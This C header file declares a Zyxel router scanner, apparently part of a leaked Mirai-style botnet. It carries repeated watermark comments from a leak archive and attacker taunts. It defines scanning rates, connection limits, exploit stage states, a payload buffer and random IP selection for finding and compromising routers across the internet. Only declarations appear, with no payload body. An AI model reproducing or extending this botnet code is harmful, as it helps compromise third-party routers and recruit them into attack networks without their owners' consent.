#pragma once//Zyxel routers scanner - downloaded by b4ckdoorarchive.host

#include <stdint.h>

#include "includes.h"

#ifdef X86_64
#define zyxelscanner_SCANNER_MAX_CONNS 512
#define zyxelscanner_SCANNER_RAW_PPS 1440
#else
#define zyxelscanner_SCANNER_MAX_CONNS 256
#define zyxelscanner_SCANNER_RAW_PPS 1024
#endif

#ifdef X86_64
#define zyxelscanner_SCANNER_RDBUF_SIZE 1024
#define zyxelscanner_SCANNER_HACK_DRAIN 64
#else
#define zyxelscanner_SCANNER_RDBUF_SIZE 1024
#define zyxelscanner_SCANNER_HACK_DRAIN 64
#endif
//Zyxel routers scanner - downloaded by b4ckdoorarchive.host 
struct zyxelscanner_scanner_connection
{
    int fd, last_recv;
    enum
    {
        zyxelscanner_SC_CLOSED,
        zyxelscanner_SC_CONNECTING,
        zyxelscanner_SC_EXPLOIT_STAGE2,
        zyxelscanner_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[zyxelscanner_SCANNER_RDBUF_SIZE];
    char payload_buf[2024];
};
//B4ckdoor was here newb
void zyxelscanner_scanner_init();
void zyxelscanner_scanner_kill(void);
//Zyxel routers scanner - downloaded by b4ckdoorarchive.host 
static void zyxelscanner_setup_connection(struct zyxelscanner_scanner_connection *);
static ipv4_t zyxelscanner_get_random_ip(void);//Zyxel routers scanner - downloaded by b4ckdoorarchive.host thanks to ATOM For the leak